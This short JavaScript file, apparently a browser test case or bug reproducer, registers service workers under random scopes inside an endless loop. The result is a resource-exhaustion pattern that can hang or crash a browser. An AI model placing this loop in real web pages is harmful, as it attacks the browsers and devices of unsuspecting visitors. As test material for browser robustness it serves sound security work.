
function getUnique() {
    const array = new Uint32Array(1);
    window.crypto.getRandomValues(array);
    const float = array[0] / (1 << 16) / (1 << 16);
    return float.toString(36).substr(2);
  }

async function configureServiceWorker() {
    const scriptUri =new URL('service_worker_binary.js', window.location).toString();
    const scope = new URL(`./${getUnique()}`, window.location.toString()).toString();
    await navigator.serviceWorker.register(scriptUri, {scope});
  }

async function main(msg) {
  while (true) {
    await configureServiceWorker();
  }
}

main(window.config);
